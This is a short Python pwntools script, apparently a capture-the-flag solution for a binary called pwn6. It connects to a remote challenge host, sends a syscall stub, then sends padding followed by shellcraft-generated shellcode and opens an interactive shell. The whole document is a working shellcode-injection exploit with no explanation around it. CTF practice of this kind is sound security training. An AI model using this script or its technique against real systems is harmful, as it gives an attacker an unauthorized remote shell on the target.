from pwn import *

sh=remote('gz.imxbt.cn',20444)
# sh=process('./pwn6')
context.arch='amd64'

sh.send(asm('''syscall'''))

payload_2=b'a'*2+asm(shellcraft.sh())
sh.send(payload_2)
sh.interactive()
